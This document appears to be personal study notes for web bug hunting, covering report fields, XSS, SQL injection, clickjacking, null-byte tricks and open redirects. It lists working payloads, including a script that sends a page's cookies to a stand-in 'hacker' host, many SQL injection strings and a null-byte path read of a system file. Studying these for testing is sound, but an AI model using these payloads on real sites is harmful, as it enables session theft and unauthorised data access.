### Reports
 - title
 - severity
 - description
 - reproduction
 - impact
 - mitigation
 - affected urls

### XSS 
Types of XSS
 - Stored: saving xss as like a comment in a dba
 - Reflected: causing css through a url, like a flash
 - DOM: input from use is stored in dom, similar to reflected by using like the location (hash #) portion to exploit
 
Process to detect
 1. Figure out where it goes, Does it get embedded in a tag or a string in a script? 
 2. Special handling.  Url turned into links?
 3. How are special characters handle "<>;:'`
 
Good scripts to try
 - `"><h1>test</h1>` - will show up well on the page
 - '+alert(1)+'
 - "onmouseover="alert(1)
 - http://"onmouseover="alert(1)
 - hello <a name="n" href="javascript:alert('xss')">*you*</a>
 - '><img src=x onerror=alert(1);> or <img src=x onerror=alertHello!> or <b onclick=alert(1)>click me!
 - "><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
 
### Injection
 - path injection - using . and .. to upload or read from system
 - command injection - using ``
 - sql - 
   - `' or 1='1` 
   - `' and 1='0`
   - `1' OR 1 = 1#`

   - ') or true--
   - ') or ('')=('
   - ') or 1--
   - ') or ('x')=('
   - " or true--
   - " or ""="
   - " or 1--
   - " or "x"="
   - ") or true--
   - ") or ("")=("
   - ") or 1--
   - ") or ("x")=("
   - 
   - '-'
   - ' '
   - '&'
   - '^'
   - '*'
   - ' or ''-'
   - ' or '' '
   - ' or ''&'
   - ' or ''^'
   - ' or ''*'
   - "-"
   - " "
   - "&"
   - "^"
   - "*"
   - " or ""-"

### Click Jacking
Embedding transparent iframe on a page over top of an area to click.  Can tell if you click on something and it doesn't do anything.

### Null Termination Bugs
The null byte terminates strings in c, you can take advantage of this for php, ruby, python when they are using dynamic includes

Allows you to truncate strings at will, really vulnerable to 

 - `?page=/etc/password%00`

### Unchecked Redirect
 - authorization (/oauth)
 - users could visit the page, be redirected and see a login page on another malicious site which dumps credentials into db
 
 Mitigation is to do away with the url entirely and either
  - remove http: from the url
  - construct/infer the url from the payload 
 
Detection
Exploitation
Mitigation
Authorization bypasses and forced browsing
Detection
Exploitation
Mitigation
